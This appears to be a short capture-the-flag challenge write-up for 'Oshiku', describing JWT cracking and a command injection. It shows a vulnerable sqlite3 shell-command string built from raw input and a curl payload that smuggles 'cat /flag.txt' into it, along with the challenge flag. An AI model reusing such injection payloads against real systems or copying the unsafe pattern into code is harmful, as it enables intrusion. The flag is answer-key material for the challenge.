# Oshiku

Author: VascoZ

## Description

Oshiku Satu JKT48

## Requirements

None

## Sources

-

## Tags

- Command Injection , JWT Crack

## Exploit

- JWT-CRACK to access admin only page
- Command Injection (into a prepared sql statement) query = 'sqlite3 database.db "SELECT biography FROM oshi WHERE name=\'' + str(name) +'\'\"'
exploit : curl -X POST -d "oshi_name=freya\"%20;%20cat%20/flag.txt;echo%20\"" (url)



## Flag

```
WRECKIT50{oshikucumansatuk0k_satujkt}
```

## connection



## Severity
HARD


